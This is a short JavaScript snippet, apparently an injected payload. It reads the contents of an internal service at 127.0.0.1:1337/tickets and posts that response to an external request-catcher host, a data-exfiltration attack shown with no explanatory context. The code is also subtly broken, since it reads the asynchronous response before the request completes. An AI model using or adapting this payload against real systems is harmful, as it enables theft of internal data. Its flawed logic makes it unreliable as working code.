const xhrr = new XMLHttpRequest();
xhrr.open("GET", "http://127.0.0.1:1337/tickets",true);

xhrr.send();
var v = xhrr.response;



let xhr = new XMLHttpRequest();
xhr.open("POST", "https://lemon.requestcatcher.com/", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
var data = v;
xhr.send(data);
